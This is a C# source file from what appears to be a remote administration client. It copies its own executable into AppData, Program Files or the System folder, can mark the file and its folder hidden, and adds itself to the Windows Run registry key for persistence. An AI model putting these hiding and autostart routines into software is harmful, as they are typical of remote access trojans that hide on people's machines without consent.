using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using RemoteAdmin.Client.Config;

namespace RemoteAdmin.Client.Modules
{
    public static class InstallationManager
    {
        public static bool PerformInstallation()
        {
            try
            {
                // Check if installation is enabled
                if (!ClientConfig.InstallClient)
                {
                    Console.WriteLine("Installation disabled in configuration");
                    return false;
                }

                string currentPath = Assembly.GetExecutingAssembly().Location;
                string installPath = GetInstallationPath();

                // Check if already installed at the correct location
                if (IsAlreadyInstalled(currentPath, installPath))
                {
                    Console.WriteLine("Already running from installation directory");

                    // Still handle startup even if already installed
                    if (ClientConfig.InstallOnStartup)
                    {
                        InstallStartup(installPath);
                    }

                    return true;
                }

                Console.WriteLine($"Installing to: {installPath}");

                // Create installation directory
                string installDir = Path.GetDirectoryName(installPath);
                if (!Directory.Exists(installDir))
                {
                    Directory.CreateDirectory(installDir);
                    Console.WriteLine($"Created directory: {installDir}");
                }

                // Copy executable to installation location
                File.Copy(currentPath, installPath, overwrite: true);
                Console.WriteLine("Executable copied successfully");

                // Set file attributes if configured
                if (ClientConfig.SetFileHidden)
                {
                    File.SetAttributes(installPath, File.GetAttributes(installPath) | FileAttributes.Hidden);
                    Console.WriteLine("File set to hidden");
                }

                // Set subdirectory attributes if configured
                if (ClientConfig.SetSubDirHidden)
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(installDir);
                    dirInfo.Attributes |= FileAttributes.Hidden;
                    Console.WriteLine("Subdirectory set to hidden");
                }

                if (ClientConfig.InstallOnStartup)
                {
                    InstallStartup(installPath);
                }

                // Start the installed copy
                Console.WriteLine("Starting installed copy...");
                System.Diagnostics.Process.Start(installPath);

                // Exit current process
                Environment.Exit(0);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Installation failed: {ex.Message}");
                return false;
            }
        }

        private static string GetInstallationPath()
        {
            string basePath;

            switch (ClientConfig.InstallLocation)
            {
                case "AppData":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;

                case "ProgramFiles":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    break;

                case "System":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    break;

                default:
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;
            }

            string fullPath = Path.Combine(basePath, ClientConfig.InstallSubDirectory, ClientConfig.InstallName + ".exe");
            return fullPath;
        }

        /// <summary>
        /// Checks if the application is already running from the installation directory
        /// </summary>
        private static bool IsAlreadyInstalled(string currentPath, string installPath)
        {
            try
            {
                // Normalize paths for comparison
                string normalizedCurrent = Path.GetFullPath(currentPath).ToLowerInvariant();
                string normalizedInstall = Path.GetFullPath(installPath).ToLowerInvariant();

                return normalizedCurrent == normalizedInstall;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Adds the application to Windows startup
        /// </summary>
        public static void InstallStartup(string? exePath = null)
        {
            try
            {
                if (string.IsNullOrEmpty(exePath))
                {
                    exePath = Assembly.GetExecutingAssembly().Location;
                    exePath = exePath.Replace(".dll", ".exe");
                }

                string startupName = ClientConfig.StartupName;
                if (string.IsNullOrWhiteSpace(startupName))
                {
                    startupName = "Client";
                }

                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue(startupName, exePath);
                        Console.WriteLine($"Added to startup as '{startupName}'");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error installing to startup: {ex.Message}");
            }
        }

        /// <summary>
        /// Removes the application from Windows startup
        /// </summary>
        public static void UninstallStartup()
        {
            try
            {
                string startupName = ClientConfig.StartupName;
                if (string.IsNullOrWhiteSpace(startupName))
                {
                    startupName = "Client";
                }

                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(startupName, false);
                        Console.WriteLine($"Removed from startup: '{startupName}'");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing from startup: {ex.Message}");
            }
        }

        /// <summary>
        /// Completely uninstalls the application
        /// </summary>
        public static void Uninstall()
        {
            try
            {
                // Remove from startup
                UninstallStartup();

                // Get installation path
                string installPath = GetInstallationPath();
                string installDir = Path.GetDirectoryName(installPath);

                // Delete the executable
                if (File.Exists(installPath))
                {
                    File.Delete(installPath);
                    Console.WriteLine($"Deleted: {installPath}");
                }

                // Delete the directory if empty
                if (Directory.Exists(installDir) && Directory.GetFiles(installDir).Length == 0)
                {
                    Directory.Delete(installDir);
                    Console.WriteLine($"Deleted directory: {installDir}");
                }

                Console.WriteLine("Uninstallation complete");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during uninstallation: {ex.Message}");
            }
        }
    }
}